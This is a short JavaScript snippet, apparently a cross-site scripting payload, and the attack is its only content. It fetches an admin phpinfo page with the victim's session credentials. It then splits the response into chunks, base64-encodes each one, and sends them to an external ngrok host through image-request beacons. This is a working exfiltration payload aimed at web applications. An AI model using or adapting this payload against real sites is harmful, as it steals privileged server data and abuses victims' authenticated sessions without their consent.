fetch('/admin/phpinfo.php',{credentials:'include'})
.then(r=>r.text())
.then(d=>{
  for(let i=0;i<d.length;i+=1000){
    new Image().src="https://b984-2402-800-61c7-e3bb-f053-3732-a0c5-7b17.ngrok-free.app/?step="+i+"&data="+encodeURIComponent(btoa(d.slice(i,i+1000)));
  }
});
